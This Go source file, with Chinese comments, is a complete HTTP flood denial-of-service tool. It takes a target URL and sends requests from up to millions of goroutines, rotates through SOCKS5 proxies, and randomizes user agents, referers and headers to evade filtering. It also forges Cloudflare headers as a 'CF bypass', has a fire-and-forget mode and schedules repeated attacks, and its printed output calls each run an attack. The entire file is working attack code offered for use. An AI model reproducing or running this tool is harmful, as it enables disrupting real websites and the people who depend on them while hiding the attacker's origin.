package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	fakeuseragent "github.com/EDDYCJY/fake-useragent"
	"golang.org/x/net/proxy"
)

// 配置结构
type Config struct {
	TargetURL         string
	Mode              string
	Threads           int
	RPS               int
	Duration          int
	Timeout           int
	ProxyFile         string
	CFBypass          bool
	RandomPath        bool
	RandomParams      bool
	Schedule          bool
	ScheduleInterval  int // 分钟
	ScheduleDuration  int // 分钟
	FireAndForget     bool // 火后不理模式，不接收响应
}

// 统计信息
type Stats struct {
	TotalRequests   int64
	SuccessfulReqs  int64
	FailedReqs      int64
	CurrentRPS      float64
	AvgRPS          float64
	StartTime       time.Time
	LastStatsTime   time.Time
	LastTotalReqs   int64
	ErrorCodes      map[int]int64 // 错误码统计
	mu              sync.RWMutex
}

var stats = &Stats{
	StartTime:     time.Now(),
	LastStatsTime: time.Now(),
	ErrorCodes:    make(map[int]int64),
}

// 代理列表
var proxies []string

func main() {
	rand.Seed(time.Now().UnixNano())

	// 解析命令行参数
	config := parseArgs()

	// 加载代理
	loadProxies(config.ProxyFile)

	// 移除启动信息输出

	// 启动统计协程
	go statsReporter()

	// 启动攻击
	if config.Schedule {
		startScheduledAttack(config)
	} else {
		startAttack(config)
	}
}

func parseArgs() *Config {
	config := &Config{
		TargetURL:        "https://example.com",
		Mode:             "post",
		Threads:          100,
		RPS:              1000,
		Duration:         60,
		Timeout:          10,
		ProxyFile:        "socks5.txt",
		CFBypass:         true,
		RandomPath:       false, // 已禁用，避免404错误
		RandomParams:     false, // 已禁用，不再添加随机查询参数
		Schedule:         false,
		ScheduleInterval: 10,
		ScheduleDuration: 20,
		FireAndForget:    false, // 默认关闭火后不理模式
	}

	flag.StringVar(&config.TargetURL, "url", config.TargetURL, "目标URL")
	flag.StringVar(&config.Mode, "mode", config.Mode, "攻击模式 (get/post/head)")
	flag.IntVar(&config.Threads, "threads", config.Threads, "线程数")
	flag.IntVar(&config.RPS, "rps", config.RPS, "每秒请求数")
	flag.IntVar(&config.Duration, "duration", config.Duration, "持续时间(秒)")
	flag.IntVar(&config.Timeout, "timeout", config.Timeout, "超时时间(秒)")
	flag.StringVar(&config.ProxyFile, "proxy-file", config.ProxyFile, "SOCKS5代理文件")
	flag.BoolVar(&config.CFBypass, "cf-bypass", config.CFBypass, "启用CF绕过")
	flag.BoolVar(&config.RandomParams, "random-params", config.RandomParams, "随机参数（已禁用，仅对文件路径添加随机数）")
	flag.BoolVar(&config.Schedule, "schedule", config.Schedule, "启用定时执行")
	flag.IntVar(&config.ScheduleInterval, "schedule-interval", config.ScheduleInterval, "定时执行间隔（分钟）")
	flag.IntVar(&config.ScheduleDuration, "schedule-duration", config.ScheduleDuration, "每次执行时长（分钟）")
	flag.BoolVar(&config.RandomPath, "random-path", config.RandomPath, "随机路径")
	flag.BoolVar(&config.FireAndForget, "fire-and-forget", config.FireAndForget, "火后不理模式，不接收响应数据，极速模式")
	flag.Parse()

	// 基本校验
	if strings.TrimSpace(config.TargetURL) == "" {
		os.Exit(1)
	}

	// 如果还传了位置参数且必要，可处理（保持向后兼容）
	args := flag.Args()
	if len(args) >= 4 && config.TargetURL == "" {
		config.Mode = args[0]
		config.TargetURL = args[1]
		if t, err := strconv.Atoi(args[2]); err == nil {
			config.Threads = t
		}
		if r, err := strconv.Atoi(args[3]); err == nil {
			config.RPS = r
		}
	}

	return config
}

func loadProxies(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}

	// 移除代理加载信息输出
}

func startAttack(config *Config) {
	// 防止 RPS 为 0 导致 panic
	if config.RPS <= 0 {
		return
	}

	interval := time.Second / time.Duration(config.RPS)
	if interval <= 0 {
		interval = time.Nanosecond // 最小间隔防止panic，但通常不会到这里
	}
	rateLimiter := time.NewTicker(interval)
	defer rateLimiter.Stop()

	done := make(chan struct{})
	var wg sync.WaitGroup
	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			worker(config, rateLimiter.C, done)
		}()
	}

	time.Sleep(time.Duration(config.Duration) * time.Second)

	fmt.Println("\n⏰ 攻击时间结束，等待所有请求完成...")
	close(done)
	wg.Wait()

	printFinalStats()
}

func startScheduledAttack(config *Config) {
	if config.ScheduleInterval <= 0 {
		return
	}
	fmt.Println("🕐 启动定时攻击模式...")
	ticker := time.NewTicker(time.Duration(config.ScheduleInterval) * time.Minute)
	defer ticker.Stop()

	for {
		executeAttack(config, config.ScheduleDuration)
		<-ticker.C
	}
}

func executeAttack(config *Config, durationMinutes int) {
	if config.RPS <= 0 {
		return
	}
	
	// 高并发优化：使用更大的线程池
	threads := config.Threads
	if config.FireAndForget {
		// 火后不理模式：支持亿万级并发
		if threads < 100000 {
			threads = 100000 // 最小10万个线程
		}
		if threads > 10000000 {
			threads = 10000000 // 最大1000万个线程
		}
	} else {
		// 普通模式
		if threads < 1000 {
			threads = 1000 // 最小1000个线程
		}
		if threads > 50000 {
			threads = 50000 // 最大50000个线程
		}
	}
	
	// 使用信号量控制并发，而不是简单的rate limiter
	bufferSize := config.RPS * 2
	if config.FireAndForget {
		bufferSize = config.RPS * 10 // 火后不理模式使用更大缓冲区
	}
	semaphore := make(chan struct{}, bufferSize)
	
	// 预填充信号量
	for i := 0; i < config.RPS; i++ {
		semaphore <- struct{}{}
	}
	
	// 启动信号量补充goroutine
	go func() {
		ticker := time.NewTicker(time.Second / time.Duration(config.RPS))
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				select {
				case semaphore <- struct{}{}:
				default:
				}
			}
		}
	}()

	done := make(chan struct{})
	var wg sync.WaitGroup
	
		// 启动大量worker goroutines
		for i := 0; i < threads; i++ {
			wg.Add(1)
			if config.FireAndForget {
				go func() {
					defer wg.Done()
					fireAndForgetWorker(config, semaphore, done)
				}()
			} else {
				go func() {
					defer wg.Done()
					highConcurrencyWorker(config, semaphore, done)
				}()
			}
		}

	duration := time.Duration(durationMinutes) * time.Minute
	time.Sleep(duration)

	close(done)
	wg.Wait()

	printFinalStats()
}

// 火后不理worker，不接收响应数据，极速模式
func fireAndForgetWorker(config *Config, semaphore <-chan struct{}, done <-chan struct{}) {
	for {
		select {
		case <-semaphore:
			// 火后不理模式：只发送请求，不等待响应
			go func() {
				statusCode := performFireAndForgetAttack(config)
				atomic.AddInt64(&stats.TotalRequests, 1)
				
				// 统计错误码
				stats.mu.Lock()
				stats.ErrorCodes[statusCode]++
				stats.mu.Unlock()
				
				if statusCode >= 200 && statusCode < 400 {
					atomic.AddInt64(&stats.SuccessfulReqs, 1)
				} else {
					atomic.AddInt64(&stats.FailedReqs, 1)
				}
			}()
		case <-done:
			return
		}
	}
}

// 高并发worker，使用信号量控制
func highConcurrencyWorker(config *Config, semaphore <-chan struct{}, done <-chan struct{}) {
	for {
		select {
		case <-semaphore:
			statusCode := performAttack(config)
			atomic.AddInt64(&stats.TotalRequests, 1)
			
			// 统计错误码
			stats.mu.Lock()
			stats.ErrorCodes[statusCode]++
			stats.mu.Unlock()
			
			if statusCode >= 200 && statusCode < 400 {
				atomic.AddInt64(&stats.SuccessfulReqs, 1)
			} else {
				atomic.AddInt64(&stats.FailedReqs, 1)
			}
		case <-done:
			return
		}
	}
}

// 保留原worker函数以兼容
func worker(config *Config, rateLimit <-chan time.Time, done <-chan struct{}) {
	for {
		select {
		case <-rateLimit:
			statusCode := performAttack(config)
			atomic.AddInt64(&stats.TotalRequests, 1)
			
			// 统计错误码
			stats.mu.Lock()
			stats.ErrorCodes[statusCode]++
			stats.mu.Unlock()
			
			if statusCode >= 200 && statusCode < 400 {
				atomic.AddInt64(&stats.SuccessfulReqs, 1)
			} else {
				atomic.AddInt64(&stats.FailedReqs, 1)
			}
		case <-done:
			return
		}
	}
}

// 火后不理攻击函数，不接收响应数据
func performFireAndForgetAttack(config *Config) int {
	if config.TargetURL == "" {
		return 0
	}

	baseURL, err := url.Parse(config.TargetURL)
	if err != nil {
		return 0
	}

	var client *http.Client
	if len(proxies) > 0 {
		px := proxies[rand.Intn(len(proxies))]
		client = createSOCKS5Client(px, config.Timeout)
	} else {
		client = createDirectClient(config.Timeout)
	}

	finalURL := buildFinalURL(baseURL, config)

	var req *http.Request
	switch strings.ToLower(config.Mode) {
	case "get":
		req, err = http.NewRequest("GET", finalURL, nil)
	case "post":
		req, err = http.NewRequest("POST", finalURL, nil)
	case "head":
		req, err = http.NewRequest("HEAD", finalURL, nil)
	default:
		req, err = http.NewRequest("GET", finalURL, nil)
	}
	if err != nil {
		return 0
	}

	setAdvancedHeaders(req, config)

	// 火后不理模式：只发送请求，不等待响应
	go func() {
		client.Do(req)
	}()

	// 假设请求成功发送
	return 200
}

func performAttack(config *Config) int {
	if config.TargetURL == "" {
		return 0
	}

	baseURL, err := url.Parse(config.TargetURL)
	if err != nil {
		return 0
	}

	var client *http.Client
	var useProxy bool
	if len(proxies) > 0 {
		px := proxies[rand.Intn(len(proxies))]
		client = createSOCKS5Client(px, config.Timeout)
		useProxy = true
	} else {
		client = createDirectClient(config.Timeout)
		useProxy = false
	}

	finalURL := buildFinalURL(baseURL, config)

	var req *http.Request
	switch strings.ToLower(config.Mode) {
	case "get":
		req, err = http.NewRequest("GET", finalURL, nil)
	case "post":
		req, err = http.NewRequest("POST", finalURL, strings.NewReader("{}"))
	case "head":
		req, err = http.NewRequest("HEAD", finalURL, nil)
	default:
		req, err = http.NewRequest("GET", finalURL, nil)
	}
	if err != nil {
		return 0
	}

	setAdvancedHeaders(req, config)

	resp, err := client.Do(req)
	if err != nil {
		// 代理失败直接返回错误，不尝试直连
		return 0
	}
	defer func() {
		if resp != nil && resp.Body != nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}()

	if resp == nil {
		return 0
	}

	// 移除状态码输出

	// 统计已在worker中处理，这里不需要重复计算

	return resp.StatusCode
}

func createSOCKS5Client(proxyAddr string, timeout int) *http.Client {
	// 支持两种代理行格式：host:port 或 socks5://host:port
	parsed := proxyAddr
	if strings.HasPrefix(proxyAddr, "socks5://") {
		parsed = strings.TrimPrefix(proxyAddr, "socks5://")
	}
	// x/net/proxy 的 SOCKS5 dialer
	dialer, err := proxy.SOCKS5("tcp", parsed, nil, proxy.Direct)
	if err != nil {
		// 无法创建 socks5 dialer -> 回退直连
		return createDirectClient(timeout)
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		// 高并发优化：启用连接复用
		DisableKeepAlives:   false,
		MaxIdleConns:        10000,       // 增加最大空闲连接数
		MaxIdleConnsPerHost: 1000,        // 每个主机最大空闲连接数
		IdleConnTimeout:     30 * time.Second,
		MaxConnsPerHost:     10000,       // 每个主机最大连接数
		// 启用HTTP/2
		ForceAttemptHTTP2: true,
	}

	// 将无上下文 dialer 包装为 DialContext
	transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		// dialer.Dial 没有 context，所以忽略 ctx
		return dialer.Dial(network, addr)
	}

	return &http.Client{
		Transport: transport,
		Timeout:   time.Duration(timeout) * time.Second,
	}
}

func createDirectClient(timeout int) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		// 高并发优化：启用连接复用
		DisableKeepAlives:   false,
		MaxIdleConns:        10000,       // 增加最大空闲连接数
		MaxIdleConnsPerHost: 1000,        // 每个主机最大空闲连接数
		IdleConnTimeout:     30 * time.Second,
		MaxConnsPerHost:     10000,       // 每个主机最大连接数
		// 优化连接建立
		DialContext: (&net.Dialer{
			Timeout:   1 * time.Second,   // 减少连接超时
			KeepAlive: 30 * time.Second,
		}).DialContext,
		// 启用HTTP/2
		ForceAttemptHTTP2: true,
	}
	return &http.Client{
		Transport: transport,
		Timeout:   time.Duration(timeout) * time.Second,
	}
}

func buildFinalURL(baseURL *url.URL, config *Config) string {
	finalURL := *baseURL

	if config.RandomPath {
		finalURL.Path = generateRandomPathForFile(finalURL.Path)
	}

	// 不再添加随机查询参数，只对文件路径添加随机数
	// if config.RandomParams {
	//	finalURL.RawQuery = generateRandomParams()
	// }

	return finalURL.String()
}

func setAdvancedHeaders(req *http.Request, config *Config) {
	userAgent := fakeuseragent.Random()
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Referer", generateRandomReferer())
	
	// 为 POST 请求设置 Content-Type
	if strings.ToLower(config.Mode) == "post" {
		req.Header.Set("Content-Type", "application/json")
	}
	
	generateRandomHeaders(req, config)

	if config.CFBypass {
		req.Header.Set("CF-IPCountry", "US")
		req.Header.Set("CF-Ray", generateCFRay())
		req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
	}
}

func generateCFRay() string {
	chars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 16)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func generateRandomPathForFile(originalPath string) string {
	if originalPath == "" {
		originalPath = "/"
	}
	if strings.Contains(originalPath, ".") && !strings.HasSuffix(originalPath, "/") {
		lastDot := strings.LastIndex(originalPath, ".")
		if lastDot > 0 {
			baseName := originalPath[:lastDot]
			extension := originalPath[lastDot:]
			randomNum := rand.Intn(10000)
			return fmt.Sprintf("%s_%d%s", baseName, randomNum, extension)
		}
	}
	randomNum := rand.Intn(10000)
	if originalPath == "/" {
		return fmt.Sprintf("/%d", randomNum)
	}
	return fmt.Sprintf("%s/%d", originalPath, randomNum)
}

func generateRandomParams() string {
	params := []string{
		"t=" + strconv.FormatInt(time.Now().Unix(), 10),
		"_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"v=" + strconv.Itoa(rand.Intn(100)),
		"ref=" + []string{"google", "bing", "yahoo", "direct"}[rand.Intn(4)],
		"utm_source=" + []string{"google", "facebook", "twitter", "email"}[rand.Intn(4)],
		"utm_medium=" + []string{"cpc", "cpm", "organic", "social"}[rand.Intn(4)],
		"utm_campaign=" + generateRandomString(8),
		"session_id=" + generateRandomString(32),
		"user_id=" + strconv.Itoa(rand.Intn(10000)),
		"page=" + strconv.Itoa(rand.Intn(100)),
	}

	numParams := rand.Intn(5) + 3
	selected := make([]string, 0, numParams)
	for i := 0; i < numParams; i++ {
		selected = append(selected, params[rand.Intn(len(params))])
	}
	return strings.Join(selected, "&")
}

func generateRandomString(length int) string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func generateRandomReferer() string {
	domains := []string{
		"google.com", "bing.com", "yahoo.com", "duckduckgo.com",
		"baidu.com", "sogou.com", "so.com", "360.cn",
		"facebook.com", "twitter.com", "instagram.com", "youtube.com",
		"reddit.com", "github.com", "stackoverflow.com", "amazon.com",
	}
	paths := []string{"/", "/search?q=", "/home", "/about", "/contact", "/blog", "/news", "/api"}
	domain := domains[rand.Intn(len(domains))]
	path := paths[rand.Intn(len(paths))]
	// 随机添加查询参数
	if strings.Contains(path, "?") {
		paramKey := []string{"q", "search", "s"}[rand.Intn(3)]
		path += paramKey + "=" + generateRandomString(6+rand.Intn(8))
	}
	if rand.Float32() < 0.3 {
		path += "&utm=" + generateRandomString(6)
	}
	return "https://www." + domain + path
}

func generateRandomHeaders(req *http.Request, config *Config) {
	headerCount := rand.Intn(11) + 5
	selected := make(map[string]bool)

	headerTypes := []string{
		"Accept", "Accept-Language", "Accept-Encoding", "Cache-Control", "Connection",
		"Upgrade-Insecure-Requests", "Sec-Fetch-Dest", "Sec-Fetch-Mode", "Sec-Fetch-Site", "Sec-Fetch-User",
	}
	for i := 0; i < headerCount; i++ {
		ht := headerTypes[rand.Intn(len(headerTypes))]
		selected[ht] = true
	}

	accepts := []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	}
	languages := []string{"en-US,en;q=0.9", "zh-CN,zh;q=0.9,en;q=0.8", "en-GB,en;q=0.9"}
	encodings := []string{"gzip, deflate, br", "gzip, deflate", "gzip"}
	cacheControls := []string{"no-cache", "max-age=0", "no-store, no-cache, must-revalidate"}

	if selected["Accept"] {
		req.Header.Set("Accept", accepts[rand.Intn(len(accepts))])
	}
	if selected["Accept-Language"] {
		req.Header.Set("Accept-Language", languages[rand.Intn(len(languages))])
	}
	if selected["Accept-Encoding"] {
		req.Header.Set("Accept-Encoding", encodings[rand.Intn(len(encodings))])
	}
	if selected["Cache-Control"] {
		req.Header.Set("Cache-Control", cacheControls[rand.Intn(len(cacheControls))])
	}

	if rand.Float32() < 0.7 {
		req.Header.Set("Pragma", "no-cache")
	}
	chromeVersions := []string{"120", "119", "121", "118", "117"}
	version := chromeVersions[rand.Intn(len(chromeVersions))]
	req.Header.Set("Sec-Ch-Ua", fmt.Sprintf("\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"%s\", \"Google Chrome\";v=\"%s\"", version, version))
	req.Header.Set("Sec-Ch-Ua-Mobile", []string{"?0", "?1"}[rand.Intn(2)])
	platforms := []string{"Windows", "macOS", "Linux", "Android", "iOS"}
	req.Header.Set("Sec-Ch-Ua-Platform", fmt.Sprintf("\"%s\"", platforms[rand.Intn(len(platforms))]))

	secFetchDests := []string{"document", "empty", "image", "script"}
	req.Header.Set("Sec-Fetch-Dest", secFetchDests[rand.Intn(len(secFetchDests))])
	secFetchModes := []string{"navigate", "cors", "no-cors", "same-origin"}
	req.Header.Set("Sec-Fetch-Mode", secFetchModes[rand.Intn(len(secFetchModes))])
	secFetchSites := []string{"none", "same-origin", "cross-site"}
	req.Header.Set("Sec-Fetch-Site", secFetchSites[rand.Intn(len(secFetchSites))])
	req.Header.Set("Sec-Fetch-User", []string{"?1", "?0"}[rand.Intn(2)])

	if rand.Float32() < 0.8 {
		req.Header.Set("Upgrade-Insecure-Requests", "1")
	}
	if rand.Float32() < 0.6 {
		req.Header.Set("DNT", []string{"1", "0"}[rand.Intn(2)])
	}
	req.Header.Set("Connection", []string{"keep-alive", "close"}[rand.Intn(2)])

	extraHeaders := []string{
		"X-Requested-With", "X-Forwarded-For", "X-Real-IP", "X-Forwarded-Proto",
		"X-Request-ID", "X-Correlation-ID", "X-Client-IP", "X-Remote-IP",
	}
	for i := 0; i < rand.Intn(5); i++ {
		h := extraHeaders[rand.Intn(len(extraHeaders))]
		if !selected[h] {
			req.Header.Set(h, generateRandomString(8+rand.Intn(12)))
			selected[h] = true
		}
	}
}

func statsReporter() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		stats.mu.Lock()
		now := time.Now()

		timeDiff := now.Sub(stats.LastStatsTime).Seconds()
		if timeDiff >= 0.0001 {
			currentRPS := float64(stats.TotalRequests-stats.LastTotalReqs) / timeDiff
			stats.CurrentRPS = currentRPS
			stats.LastTotalReqs = stats.TotalRequests
			stats.LastStatsTime = now
		}

		uptime := now.Sub(stats.StartTime).Seconds()
		if uptime > 0 {
			stats.AvgRPS = float64(stats.TotalRequests) / uptime
		}

		// 移除实时统计输出

		stats.mu.Unlock()
	}
}

func printFinalStats() {
	stats.mu.RLock()
	defer stats.mu.RUnlock()

	uptime := time.Since(stats.StartTime).Seconds()
	total := stats.TotalRequests
	success := stats.SuccessfulReqs
	fail := stats.FailedReqs
	avgRPS := stats.AvgRPS

	fmt.Printf("\n\n🎯 攻击完成！\n")
	fmt.Printf("总请求数: %d\n", total)
	fmt.Printf("成功请求: %d\n", success)
	fmt.Printf("失败请求: %d\n", fail)
	if total > 0 {
		fmt.Printf("成功率: %.2f%%\n", float64(success)/float64(total)*100)
	} else {
		fmt.Printf("成功率: N/A (没有请求)\n")
	}
	fmt.Printf("平均RPS: %.2f\n", avgRPS)
	fmt.Printf("运行时间: %.2f秒\n", uptime)
	
	// 输出错误码统计
	fmt.Printf("\n📊 错误码统计:\n")
	if len(stats.ErrorCodes) > 0 {
		// 按状态码排序
		var codes []int
		for code := range stats.ErrorCodes {
			codes = append(codes, code)
		}
		sort.Ints(codes)
		
		for _, code := range codes {
			count := stats.ErrorCodes[code]
			percentage := float64(count) / float64(total) * 100
			fmt.Printf("  %d: %d 次 (%.2f%%)\n", code, count, percentage)
		}
	} else {
		fmt.Printf("  无错误码记录\n")
	}
}
